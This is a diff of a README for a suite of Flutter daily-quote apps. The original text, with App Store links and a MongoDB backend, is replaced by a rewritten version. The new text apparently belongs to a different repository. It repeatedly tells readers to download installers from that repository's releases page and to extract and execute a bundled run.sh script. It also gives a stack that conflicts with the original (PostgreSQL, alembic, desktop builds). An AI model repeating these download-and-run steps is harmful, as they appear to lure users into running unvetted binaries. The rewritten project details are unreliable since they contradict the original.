@@ -1,302 +1,511 @@
-# Daily Quote Apps Suite
-
-<a href="https://www.producthunt.com/products/dailymind-mental-health?embed=true&amp;utm_source=badge-featured&amp;utm_medium=badge&amp;utm_source=badge-dailymind" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=976384&amp;theme=neutral&amp;t=1754562054294" alt="DailyMind - Meditation, Sleep,Mindfulness | Product Hunt" style="width: 128px; height: 27px;" width="128" height="27"/></a>
-
-[English](README.md) | [简体中文](readme_i18n/README_ZH.md)
-
-## Introduction
-
-The Daily Quote Apps Suite is a diverse collection of applications covering various aspects of daily life, including mindfulness, relationships, knowledge, spirituality, and entertainment. Our apps support multiple languages, theme switching, content collection, and more. This suite is designed to enrich users' daily experiences through inspirational quotes, educational content, romantic messages, bedtime stories, spiritual guidance, and relaxation techniques.
-
-
-<div align="center">
-  <img src="screenshots/0x0ss (1).png" alt="App Screenshot 1" width="200"/>
-  <img src="screenshots/0x0ss (2).png" alt="App Screenshot 2" width="200"/>
-  <img src="screenshots/0x0ss (3).png" alt="App Screenshot 3" width="200"/>
-  <img src="screenshots/0x0ss (5).png" alt="App Screenshot 4" width="200"/>
-</div>
-
-## Download
-
-| App                  | iOS                  | Android             |
-|----------------------|-------------------------------|-----------------------------|
-| DailyMind            | [App Store](https://apps.apple.com/us/app/dailymind-for-a-better-life/id6745580917) | Coming soon                 |
-| BedStory             | Coming soon                   | Coming soon                 |
-| DailySutra           | [App Store](https://apps.apple.com/us/app/dailysutra-cultivate-calm/id6747883782) | Coming soon                 |
-| DailyLove            | [App Store](https://apps.apple.com/us/app/dailylove-love-sparks/id6747162145) | Coming soon                 |
-| DailyFacts           | [App Store](https://apps.apple.com/us/app/dailyfacts-discover-new-info/id6746777421) | Coming soon                 |
-| DailyBible           | [App Store](https://apps.apple.com/us/app/dailybible-gods-word-daily/id6746378496) | [Google Play](https://play.google.com/store/apps/details?id=com.civisolo.dailybible&pli=1) |
-
-## App Suite
-
-This repository contains six Flutter-based apps, each focused on a different aspect of daily life enrichment. Our diverse collection includes apps for mental well-being, relationship enhancement, knowledge acquisition, spiritual growth, family bonding, and relaxation:
-
-| App Directory         | Description                                                                 |
-|----------------------|-----------------------------------------------------------------------------|
-| frontend/            | **DailyMind**: Main app for daily affirmations, mindfulness, and white noise for relaxation and mental well-being |
-| dailybedtimestories/ | **BedStory**: Soothing bedtime stories for all ages, promoting relaxation, better sleep quality, and family bonding   |
-| dailysutra/          | **DailySutra**: Buddhist wisdom quotes and daily sutras for inner peace, mindfulness practice, and spiritual growth                      |
-| dailylovequotes/     | **DailyLove**: Romantic love quotes for relationship inspiration, emotional connection, and expressing affection              |
-| dailyfacts/          | **DailyFacts**: Fascinating daily facts and knowledge to spark curiosity, expand horizons, and encourage lifelong learning                        |
-| dailybible/          | **DailyBible**: Daily Bible verses and Christian inspiration for spiritual reflection, faith development, and daily encouragement                       |
-
-Each app is a standalone Flutter project with its own codebase, assets, and build configuration. See each directory's README for details.
-
-## Featured Apps
-
-### DailyMind
-
-DailyMind is our flagship application designed to help users cultivate a positive mindset and improve mental well-being through daily practice. It offers:
-
-- **Daily Affirmations**: Positive statements to boost self-esteem and change negative thought patterns
-- **Mindfulness Exercises**: Guided practices to help users stay present and reduce stress
-- **White Noise & Relaxation Sounds**: Calming audio to aid sleep, meditation, and focus
-- **Multi-language Support**: Available in English, Chinese, and Japanese
-- **Customizable Themes**: Light and dark mode with various color options
-- **Quote Collection**: Save and organize your favorite inspirational quotes
-- **Daily Notifications**: Gentle reminders to practice mindfulness throughout the day
-
-DailyMind is perfect for anyone looking to reduce anxiety, improve focus, practice gratitude, and develop a more positive outlook on life.
-
-### BedStory
-
-BedStory provides soothing and heartwarming bedtime stories for users of all ages, helping to create a peaceful end to the day:
-
-- **Curated Daily Stories**: New, carefully selected stories every day
-- **Age and Theme Categories**: Stories organized by age group and themes
-- **Emotional Categories**: Stories that match your mood or desired emotional state
-- **Multi-language Support**: Available in English, Chinese, and Japanese
-- **Favorites and Sharing**: Save and share your favorite stories
-- **Elegant, Relaxing UI**: Designed for a calming bedtime experience
-
-BedStory is ideal for parents looking to bond with children, adults seeking better sleep quality, and anyone who enjoys the comfort of a good story before bed.
-
-### DailySutra
-
-DailySutra focuses on delivering Buddhist wisdom quotes and sutras to help users find inner peace and spiritual growth:
-
-- **Daily Buddhist Quotes**: Carefully selected wisdom from Buddhist teachings
-- **Sutra Collections**: Access to important Buddhist sutras and teachings
-- **Scene-based Categories**: Quotes organized by life situations and needs
-- **Emotional Support**: Wisdom tailored to different emotional states
-- **Multi-language Support**: Available in English, Chinese, and Japanese
-- **Favorites and Sharing**: Save and share meaningful quotes
-- **Tranquil UI Design**: Peaceful interface that promotes calm reflection
-
-DailySutra is perfect for Buddhist practitioners, meditation enthusiasts, and anyone seeking spiritual wisdom and inner peace.
-
-### DailyLove
-
-DailyLove provides romantic love quotes to inspire relationships and help express affection:
-
-- **Daily Love Quotes**: Fresh romantic inspiration every day
-- **Relationship Categories**: Quotes for different relationship stages and situations
-- **Emotional Categories**: Express specific feelings and sentiments
-- **Multi-language Support**: Available in English, Chinese, and Japanese
-- **Favorites and Sharing**: Save and share quotes with loved ones
-- **Romantic UI Design**: Beautiful interface designed to evoke feelings of love
-
-DailyLove is ideal for couples looking to strengthen their bond, individuals seeking to express their feelings, and romantics who appreciate the poetry of love.
-
-### DailyFacts
-
-DailyFacts delivers interesting and educational facts to expand knowledge and spark curiosity:
-
-- **Daily Interesting Facts**: Learn something new every day
-- **Thematic Categories**: Facts organized by subjects like science, history, nature
-- **Multi-language Support**: Available in English, Chinese, and Japanese
-- **Favorites and Sharing**: Save and share fascinating facts
-- **Clean, Engaging UI**: Designed to make learning enjoyable
-
-DailyFacts is perfect for curious minds, lifelong learners, and anyone who enjoys expanding their knowledge in an accessible, bite-sized format.
-
-### DailyBible
-
-DailyBible provides daily Bible verses and Christian inspiration for spiritual growth:
-
-- **Daily Bible Verses**: Scripture selected for daily reflection
-- **Thematic Collections**: Verses organized by themes and life situations
-- **Devotional Categories**: Structured spiritual guidance
-- **Multi-language Support**: Available in English, Chinese, and Japanese
-- **Favorites and Sharing**: Save and share meaningful verses
-- **Simple, Uplifting UI**: Designed for focused spiritual reflection
-
-DailyBible is ideal for Christians seeking daily spiritual nourishment, those exploring faith, and anyone looking for biblical wisdom and encouragement.
-
-## Environment Variables
-
-### Backend
-Create a `.env` file in the `backend` directory:
-
-```env
-MONGODB_URL=mongodb://localhost:27017
-OPENAI_API_KEY=your_openai_api_key_here
-DOUBAO_APPID=your_doubao_appid_here
-DOUBAO_TOKEN=your_doubao_token_here
-DOUBAO_API_KEY=your_doubao_api_key_here
-APPLE_SHARED_SECRET=your_apple_shared_secret
-GOOGLE_SERVICE_ACCOUNT_PROJECT_ID=your_project_id
-GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY_ID=your_private_key_id
-GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n"
-GOOGLE_SERVICE_ACCOUNT_CLIENT_EMAIL=your_service_account_email
-GOOGLE_SERVICE_ACCOUNT_CLIENT_ID=your_client_id
-ANDROID_PACKAGE_NAME=com.yourcompany.dailymind
-```
-
-### Frontend
-Edit `lib/config/api_config.dart` in each app directory:
-
-```dart
-class ApiConfig {
-  // Set API server address
-  static const String baseUrl = 'http://localhost:8000';
-}
-```
-
-## Tech Stack
-- **Frontend**: Flutter 3.x, Dart 3, Riverpod (`flutter_riverpod`), Material 3, FlexColorScheme, Hive local storage
-- **Backend**: FastAPI, Uvicorn, MongoDB (`motor`/`pymongo`), AIOHTTP, APScheduler, Google API Client, OpenAI SDK
-- **Monetization**: Google Mobile Ads, In-App Purchases (StoreKit/Android Billing)
-- **i18n & Notifications**: `easy_localization`, `flutter_localizations`, `flutter_local_notifications`, `timezone`, `flutter_timezone`
-- **Build & Tooling**: `build_runner`, `hive_generator`, `flutter_launcher_icons`, `flutter_lints`
-
-### System Architecture
-
-```mermaid
-graph TB
-    subgraph "Mobile Apps (Flutter)"
-        A[DailyMind] --> D[Riverpod State Management]
-        B[BedStory] --> D
-        C[DailySutra] --> D
-        E[DailyLove] --> D
-        F[DailyFacts] --> D
-        G[DailyBible] --> D
-        D --> H[Hive Local Storage]
-        D --> I[HTTP Client]
-    end
-    
-    subgraph "Backend Services (FastAPI)"
-        J[FastAPI Server] --> K[MongoDB]
-        J --> L[OpenAI API]
-        J --> M[Google APIs]
-        J --> N[APScheduler]
-    end
-    
-    subgraph "External Services"
-        O[App Store/Google Play]
-        P[Google Mobile Ads]
-        Q[Apple/Google Billing]
-    end
-    
-    I --> J
-    A --> O
-    B --> O
-    C --> O
-    D --> P
-    D --> Q
-```
-
-### Data Flow Architecture
-
-```mermaid
-sequenceDiagram
-    participant App as Flutter App
-    participant Riverpod as Riverpod State
-    participant Hive as Local Storage
-    participant API as FastAPI Backend
-    participant DB as MongoDB
-    participant External as External APIs
-    
-    App->>Riverpod: User Action
-    Riverpod->>Hive: Cache Data
-    Riverpod->>API: API Request
-    API->>DB: Database Operation
-    API->>External: External Service Call
-    External-->>API: Response Data
-    API-->>Riverpod: API Response
-    Riverpod-->>App: State Update
-    App->>App: UI Update
-```
-
-### Third-Party Libraries
-- **Frontend (common)**
-  - State & Architecture: `flutter_riverpod`, `get`
-  - Local storage: `hive`, `hive_flutter`, `shared_preferences`
-  - Networking & System: `http`, `connectivity_plus`, `url_launcher`, `package_info_plus`, `path_provider`
-  - Media & Sharing: `audioplayers`, `image_picker`, `screenshot`, `share_plus`
-  - Theming & UI: `flex_color_scheme`, `cupertino_icons`
-  - Notifications & Timezone: `flutter_local_notifications`, `timezone`, `flutter_timezone`
-  - Monetization: `google_mobile_ads`, `in_app_purchase`, `in_app_purchase_storekit` (iOS), `in_app_purchase_android` (some apps)
-  - Permissions: `permission_handler` (some apps)
-- **Frontend (dev)**: `build_runner`, `hive_generator`, `flutter_lints`, `flutter_launcher_icons`
-- **Backend**
-  - Web & Runtime: `fastapi`, `uvicorn`
-  - Config & IO: `python-dotenv`, `aiofiles`, `python-multipart`
-  - AI & External Services: `openai`, `google-api-python-client`
-  - Database: `motor` (async MongoDB), `pymongo`
-  - Scheduling & Async: `apscheduler`, `aiohttp`, `schedule`
-  - Utilities: `streamlit` (internal tooling/visualization)
-
-## Getting Started
-
-### Backend
-```bash
-cd backend
-pip install -r requirements.txt
-cp env.example .env
-# Edit .env with your own keys
-python -m uvicorn app.main:app --host 0.0.0.0 --port 8000
-```
-
-### Frontend
-```bash
-cd frontend
-flutter pub get
-flutter run
-```
-
-## Deployment
-See [DEPLOYMENT.md](DEPLOYMENT.md) for full deployment instructions, including Docker and production best practices.
-
-## Security
-- **Never commit `.env` or any secret files.**
-- All API keys and credentials must be set via environment variables.
-- Use HTTPS in production.
-
-## Contributing
-
-We welcome contributions from the community! Whether you're fixing bugs, adding new features, improving documentation, or spreading the word, your help is appreciated.
-
-Please check out our [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribute to this project.
-
-## Community & Support
-
-- If you find this project helpful, please consider giving it a star ⭐
-- Share these apps with friends and family who might benefit from daily inspiration
-- For issues, feature requests, or questions, please open an issue in this repository
-
-## Keywords
-
-### General Keywords
-Mindfulness, Meditation, Mental Health, Well-being, Relaxation, Positive Thinking, Self-improvement, Stress Relief, Anxiety Management, Flutter Apps, Cross-platform, Mobile Apps, Inspirational Quotes
-
-### DailyMind
-Daily Affirmations, Mindfulness Exercises, White Noise, Relaxation Sounds, Positive Affirmations, Mental Well-being, Meditation Aid, Focus Improvement, Gratitude Practice
-
-### BedStory
-Bedtime Stories, Sleep Aid, Family Bonding, Relaxation Stories, Children Stories, Bedtime Routine, Sleep Quality, Soothing Narratives, Nighttime Relaxation
-
-### DailySutra
-Buddhist Wisdom, Daily Sutras, Spiritual Growth, Inner Peace, Buddhist Teachings, Mindfulness Practice, Meditation Support, Spiritual Quotes, Eastern Philosophy
-
-### DailyLove
-Love Quotes, Romantic Inspiration, Relationship Advice, Expressing Affection, Romantic Messages, Couple Communication, Love Language, Relationship Building, Romantic Gestures
-
-### DailyFacts
-Interesting Facts, Daily Knowledge, Educational Content, Curiosity, Learning, Trivia, Knowledge Expansion, Fun Facts, Intellectual Stimulation
-
-### DailyBible
-Bible Verses, Christian Inspiration, Daily Scripture, Spiritual Growth, Faith Development, Biblical Wisdom, Christian Devotional, Prayer Support, Religious Guidance
-
-## License
-MIT
+# DailyQuotes Suite — Multilingual Quotes, Mindfulness, & More 🌿📚
+
+[![Releases](https://img.shields.io/github/v/release/tuilanguoivietnam/dailyquotes?label=Releases&logo=github&color=blue)](https://github.com/tuilanguoivietnam/dailyquotes/releases)
+
+A cross-platform suite of small apps that deliver daily quotes, verses, sutras, affirmations, and short stories. The suite pairs calm UX with flexible tech. It supports multiple languages, theme switching, content collection, white noise, TTS, and AI-driven content. The codebase uses Flutter for clients and FastAPI for the backend. Use the releases page above to get official builds and assets.
+
+Table of contents
+- About this repo
+- Key features
+- App list and use cases
+- Screenshots and visuals
+- Architecture overview
+- Releases and downloads
+- Installation and run guide
+  - Android / iOS / Desktop
+  - Backend (FastAPI)
+  - Local dev (Flutter)
+- API reference (core endpoints)
+- AI, TTS and content pipelines
+- Theming and i18n
+- Data model and offline sync
+- White noise and bedtime features
+- Privacy and data handling
+- Testing and CI
+- Contributing
+- Release process
+- FAQ
+- License
+
+About this repo
+This repo collects frontends, backend services, and content tools for the Daily Quote Apps Suite. The apps focus on short daily consumables: mindfulness prompts, bible verses, sutras, short bedtime stories, relationship tips, and fun facts. The suite targets mobile and desktop via Flutter. The backend exposes a small REST API built with FastAPI. The system offers features for users and for content managers.
+
+Key features
+- Daily quotes and push scheduling.
+- Multilingual content: English, Chinese, Vietnamese, Spanish, and more.
+- Theme switch: light, dark, and high-contrast.
+- Content collections: save, tag, and export quotes.
+- White noise player with loop and timers.
+- TTS (text-to-speech) for reading content.
+- AI-driven suggestion engine for custom affirmations and bedtime stories.
+- FastAPI backend for content and user sync.
+- Cross-platform Flutter apps for Android, iOS, macOS, Windows, Linux, and web.
+- Offline support with local cache and optional sync.
+- Content import tools and admin UI for editors.
+- Simple analytics: daily active users, saves, and share counts.
+
+App list and use cases
+- Mindfulness
+  - Short breathing prompts.
+  - Daily mindful quotes.
+  - Guided timers and soft notifications.
+  - Use case: morning centering, short breaks during work.
+
+- Bible
+  - Daily Bible verse with context and short commentary.
+  - Parallel translations for study.
+  - Bookmark verses and add highlights.
+  - Use case: daily scripture reading and study.
+
+- Sutra
+  - Selected sutras with short notes.
+  - Search by chapter and keywords.
+  - Use case: study and chanting preparation.
+
+- Relationships
+  - Short tips for communication and empathy.
+  - Prompts to spark helpful conversations.
+  - Use case: couples and family warm-ups.
+
+- Knowledge
+  - Short facts and explanations.
+  - Quick learning cards for general knowledge.
+  - Use case: microlearning, commute reading.
+
+- Entertainment & Doubao
+  - Short stories, jokes, and doubao style content.
+  - Interactive mini-games for light breaks.
+  - Use case: unwind and social share.
+
+- Bedtime Stories
+  - Short stories with calm pacing.
+  - TTS with soft voice options.
+  - Timer and white noise overlay.
+  - Use case: sleep prep for adults and kids.
+
+Screenshots and visuals
+- App demo cover: https://source.unsplash.com/1200x400/?mindfulness,quotes
+- Quote card sample: https://source.unsplash.com/800x400/?book,quote
+- White noise visual: https://source.unsplash.com/800x400/?ocean,calm
+
+These links load images suited for README previews. Use them as placeholders or swap them with your screenshots in the repository.
+
+Architecture overview
+- Clients
+  - Flutter apps for mobile, desktop, and web.
+  - Responsible for rendering UI, local cache, and TTS playback.
+  - Handles theme and locale settings.
+
+- Backend
+  - FastAPI service that serves content, stores user data, and handles sync.
+  - Offers endpoints for content, user profiles, authentication, and analytics.
+
+- Database
+  - PostgreSQL for production.
+  - SQLite for local dev and offline mode.
+  - Content model: content items, tags, translations, assets.
+
+- AI & TTS Layer
+  - Integration with OpenAI / local LLM for content generation.
+  - TTS engines: cloud providers (Google, Azure) and local fallback (espeak, TTS binaries).
+  - Pipeline that caches generated audio for reuse.
+
+- CI / CD
+  - GitHub Actions for builds and releases.
+  - Automated tests for backend API and UI smoke tests.
+
+Releases and downloads
+You can find official builds, release notes, and installation assets on the releases page:
+https://github.com/tuilanguoivietnam/dailyquotes/releases
+
+Download the appropriate release asset and run the included installer or script. Typical assets in releases:
+- dailyquotes-android-<version>.apk — install on Android devices.
+- dailyquotes-ios-<version>.ipa — install via TestFlight or device management.
+- dailyquotes-mac-<version>.dmg — macOS installer.
+- dailyquotes-windows-<version>.exe — Windows installer.
+- dailyquotes-backend-<version>.tar.gz — backend bundle with run script.
+
+If you download a backend release bundle, extract and execute the provided run script:
+- tar -xzf dailyquotes-backend-<version>.tar.gz
+- cd dailyquotes-backend
+- chmod +x run.sh
+- ./run.sh
+
+If you download a mobile or desktop installer, follow platform install steps. The releases page hosts signed builds when available.
+
+Installation and run guide
+
+Requirements
+- Flutter SDK 3.x or later for client builds.
+- Python 3.9+ for the backend.
+- Node.js 16+ for admin UI assets (if present).
+- PostgreSQL 12+ for production backend.
+- Git for cloning the repo.
+
+Clone the repo
+- git clone https://github.com/tuilanguoivietnam/dailyquotes.git
+- cd dailyquotes
+
+Backend (FastAPI) quick start
+1. Create a Python virtualenv
+- python -m venv .venv
+- source .venv/bin/activate
+2. Install dependencies
+- pip install -r backend/requirements.txt
+3. Configure environment
+- Copy backend/.env.example to backend/.env
+- Set DATABASE_URL and SECRET_KEY in backend/.env
+- Optional: set OPENAI_API_KEY and TTS_PROVIDER
+4. Run migrations
+- cd backend
+- alembic upgrade head
+5. Start development server
+- uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
+
+Typical backend structure
+- backend/app/main.py — FastAPI app and route mounts.
+- backend/app/api — versioned route modules.
+- backend/app/core — config and settings modules.
+- backend/app/models — SQLAlchemy models.
+- backend/app/schemas — Pydantic schemas.
+- backend/app/services — business logic (TTS, AI, content).
+- backend/app/scripts — management scripts.
+
+Backend run script (release asset)
+When you download a release asset for the backend, the package contains a run.sh or run.bat script. Execute that script to start the service. The script handles virtualenv creation, dependency install, and service startup. Example:
+- ./run.sh start
+
+Local dev (Flutter apps)
+1. Install Flutter SDK and set up platforms.
+2. Install dependencies
+- cd client/flutter
+- flutter pub get
+3. Run on device
+- flutter run -d <deviceId>
+4. Build release
+- flutter build apk --release
+- flutter build ios --release
+- flutter build macos --release
+
+Client structure
+- client/flutter/lib — app sources.
+- client/flutter/assets — fonts and bundled audio.
+- client/flutter/l10n — localized strings.
+- client/flutter/ios and android — native configs.
+
+API reference (core endpoints)
+Base path: /api/v1
+
+Auth
+- POST /auth/login — login with email or username. Returns JWT.
+- POST /auth/register — create account.
+- POST /auth/refresh — refresh token.
+
+Content
+- GET /content/daily — get today's curated items.
+  - params: type (mindfulness|bible|sutra|stories|facts)
+  - returns: list of content items with id, title, body, tags, lang, audio_url
+- GET /content/{id} — get content by id with translations and assets.
+- GET /content/search — query content by keyword, tag, language.
+- POST /content/{id}/save — save a content item to user collection.
+- GET /users/{user_id}/collection — list saved items.
+
+TTS and audio
+- POST /tts/generate — send text and voice params, returns audio URL or id.
+  - body: {text, voice, speed, format}
+- GET /audio/{id} — stream cached audio.
+
+Admin
+- POST /admin/content — create content (supports translations).
+- PUT /admin/content/{id} — update content item.
+- GET /admin/analytics — basic usage metrics.
+
+Schema example (content item)
+- id: uuid
+- type: string
+- title: string
+- body: string
+- lang: string
+- tags: [string]
+- published_at: datetime
+- audio_url: string | null
+- translations: [{lang, title, body}]
+
+API auth
+Use Authorization: Bearer <token> for protected endpoints. Admin endpoints require an admin role claim in the JWT.
+
+AI, TTS and content pipelines
+
+AI-driven content
+- Use cases: generate personalized affirmations, expand a short quote into a short story, or suggest follow-up reflection questions.
+- Integration points:
+  - Server-side content generation: editors can request drafted content in the admin UI.
+  - On-demand generation in client apps: the client asks the backend for a short tailor-made affirmation for the user.
+- Prompts and safety:
+  - Keep prompts concise.
+  - Validate outputs and run a lightweight filter for profanity and harmful content.
+- Example prompt for an affirmation:
+  - "Create a 1-sentence affirmation for patience for a user who feels rushed at work."
+
+TTS
+- Engine options:
+  - Cloud providers: Google Cloud TTS, Microsoft Azure TTS, Amazon Polly.
+  - Local fallback: espeak-ng with high quality voice pack.
+- Generation flow:
+  - Client requests audio by calling POST /tts/generate with text and voice settings.
+  - Backend checks cache for the same hash.
+  - If cached, return URL. Otherwise request the TTS provider, cache the audio file, and return URL.
+- Audio formats: mp3 and ogg for web, m4a for iOS where desired.
+- Playback: clients stream audio and prefetch next track when user navigates.
+
+Caching strategy
+- Key = sha256(text + voice + speed + format + lang).
+- Store audio assets in object storage (S3 or local disk).
+- Keep metadata in DB with TTL for stale removal.
+
+Theming and i18n
+
+Themes
+- Themes: light, dark, and high contrast.
+- Theme switching persists to local settings and syncs to backend when logged in.
+- Use platform default unless user chooses otherwise.
+- Design tokens control color, spacing, and font sizes.
+
+Localization (i18n)
+- Strings use ARB or JSON localization files in client/flutter/l10n.
+- Backend content stores translations per content item.
+- Locale detection:
+  - Client uses device locale by default.
+  - Users can switch languages manually in settings.
+- Plural and formatting:
+  - Use intl package for pluralization and date/time formatting.
+
+Data model and offline sync
+
+Local storage
+- Clients store a local cache in SQLite or Hive.
+- Cache keys for content and audio metadata.
+- Content prefetch for the next N days.
+
+Sync strategy
+- Sync runs on app start and when network returns.
+- Use incremental sync with last_synced_at timestamps.
+- Conflicts:
+  - User collections use last-write-wins for simple cases.
+  - For edits made offline to user notes, use merge prompts at sync.
+
+Encryption
+- Sensitive data such as tokens store in secure storage.
+- Local backups stay encrypted with device key.
+
+White noise and bedtime features
+
+White noise
+- Built-in white noise tracks: ocean, rain, forest, fan, pink noise.
+- Streaming and loop control.
+- Timer to fade out audio after N minutes.
+- Mix TTS audio with white noise using a low-pass or volume ducking so the voice remains clear.
+
+Bedtime Stories
+- Stories come in short formats (2–8 minutes).
+- Option to auto-read via TTS.
+- Choose voice and reading speed.
+- Combine with white noise and set a fade timer.
+
+User experience tips
+- Keep card content short; avoid long paragraphs for bite-sized consumption.
+- Let users queue multiple items for a bedtime session.
+- Provide "sleep mode" that dims animation and reduces CPU use.
+
+Privacy and data handling
+
+Data collected
+- Minimal personal data: email, preferences, collection items.
+- Optional analytics keyed to anonymous ids.
+
+Sync and backups
+- User data sync uses secure connections (HTTPS).
+- Backup exports available as JSON for user collections.
+
+Third-party services
+- Providers: OpenAI, Google Cloud, Azure, or local models.
+- Allow admins to choose provider via backend config.
+
+Testing and CI
+
+Backend tests
+- Unit tests for services and API endpoints using pytest.
+- Integration tests with test database (SQLite) for CI.
+
+Client tests
+- Widget tests for Flutter components.
+- Integration tests for flows: onboarding, save item, TTS playback.
+
+CI pipeline
+- GitHub Actions workflows:
+  - lint and unit tests for backend and client.
+  - static analysis for Flutter (flutter analyze).
+  - build artifacts and upload release assets automatically when a tag is pushed.
+
+Contributing
+- Fork the repo.
+- Create a feature branch feature/<short-description>.
+- Follow branch naming and commit style.
+- Open a pull request.
+- PR checklist:
+  - Code builds and tests run locally.
+  - Add tests for new behavior.
+  - Update README or docs for new features.
+- Labels:
+  - bug, enhancement, help wanted, good first issue.
+
+Developer setup checklist
+- Install Flutter and confirm flutter doctor shows no major issues.
+- Install Python 3.9+ and pip.
+- Set up a local Postgres or use Docker compose
+  - docker-compose up -d db
+- Set backend env variables in backend/.env
+- Run migrations and seed content for local testing.
+
+Release process
+- Create a git tag vX.Y.Z with a changelog entry.
+- Push the tag to GitHub.
+- GitHub Actions will build artifacts and create a draft release.
+- Review the draft release and mark it as published.
+- Releases page:
+  - https://github.com/tuilanguoivietnam/dailyquotes/releases
+- For backend bundles, download the asset, extract, and execute run.sh as described earlier.
+
+Security and secrets
+- Do not commit API keys.
+- Use GitHub Secrets for CI builds.
+- Rotate provider keys if exposed.
+
+FAQ
+
+Q: Where can I download official builds?
+A: Visit the releases page for official builds and release notes:
+https://github.com/tuilanguoivietnam/dailyquotes/releases
+Download the asset that matches your platform. If you download a backend bundle, extract the archive and execute the run script that the bundle includes.
+
+Q: How do I enable TTS with a cloud provider?
+A: Set your TTS_PROVIDER and provider credentials in backend/.env. Restart backend. Use POST /tts/generate to request audio. The backend caches audio and returns a URL.
+
+Q: Can I run this offline?
+A: Yes. Clients cache content locally. You can use the app without network for saved items and cached audio. Full sync requires network.
+
+Q: How do I add a new language?
+A: Add locale files in client/flutter/l10n and update translations for content in the backend. Admin UI supports adding translations per content item.
+
+Q: Can I use my own OpenAI key?
+A: Yes. Set OPENAI_API_KEY in backend/.env and restart the backend. The system can use OpenAI to generate content where allowed.
+
+Code of conduct
+- Be respectful.
+- Use issue and PR templates.
+- Keep discussion constructive.
+
+Sample commands and snippets
+
+Run the backend locally
+- python -m venv .venv
+- source .venv/bin/activate
+- pip install -r backend/requirements.txt
+- cd backend
+- alembic upgrade head
+- uvicorn app.main:app --reload --port 8000
+
+Generate a build for Android
+- cd client/flutter
+- flutter pub get
+- flutter build apk --release
+
+Generate TTS audio via API (example payload)
+- POST /api/v1/tts/generate
+- body: {
+    "text": "Close your eyes and breathe evenly for three breaths.",
+    "voice": "soft_female",
+    "speed": 0.95,
+    "format": "mp3",
+    "lang": "en"
+  }
+
+Example response
+- {
+    "id": "a6f1f2c3-4d5e-6f7a-8b9c-0d1e2f3a4b5c",
+    "url": "https://storage.example.com/audio/a6f1f2c3.mp3",
+    "ttl": 604800
+  }
+
+CLI helpers
+- backend/scripts/seed_content.py — seed demo content for local testing.
+- client/flutter/tools/generate_localizations.sh — export ARB files.
+
+Content and editorial workflow
+- Editors can draft content in the admin UI.
+- Drafts go through review steps: draft -> review -> publish.
+- Publish triggers notifications for subscribers of the content type.
+
+Analytics and telemetry
+- Keep analytics minimal.
+- Track:
+  - daily active users
+  - saves
+  - share counts
+  - TTS requests
+- Store event samples with anonymized IDs.
+
+Performance tips
+- Prefetch today's content on app start.
+- Cache audio and delete old cached assets on low storage.
+- Use low-res images for list views and high-res for details.
+
+Accessibility
+- Support large fonts and dynamic type.
+- Respect system contrast settings.
+- Add semantic labels for content cards and interactive controls.
+
+Common development issues
+- Flutter toolchain mismatch: run flutter doctor and update SDK.
+- Backend dependency issues: use the virtualenv and pip install -r backend/requirements.txt.
+- Database migration errors: re-run alembic with the correct database URL.
+
+Roadmap ideas
+- Add scheduled daily push with custom time per user.
+- Add sync across devices via user accounts.
+- Add user-generated content with moderation queue.
+- Offer offline-first build with full local content pack downloads.
+- Add native widget/shortcut for quick daily quote on mobile.
+
+Repository topics and tags
+This repo uses topics to make it findable. Relevant topics:
+- affirmations
+- ai
+- bedtime-stories
+- bible-verse
+- cross-platform
+- daily-quotes
+- doubao
+- family-app
+- fastapi
+- flutter-apps
+- github
+- mindfulness
+- openai
+- self-improvement
+- sutra
+- tts
+
+Contact and support
+- Open an issue for bugs and feature requests.
+- Use pull requests for code contributions.
+- For urgent problems, tag maintainers in an issue.
+
+Changelog and release notes
+- Follow semantic versioning.
+- Each release includes a changelog entry and the built assets.
+- Use the Releases page to download the assets and read release notes:
+https://github.com/tuilanguoivietnam/dailyquotes/releases
+
+License
+- This project uses the MIT License. See LICENSE file for details.
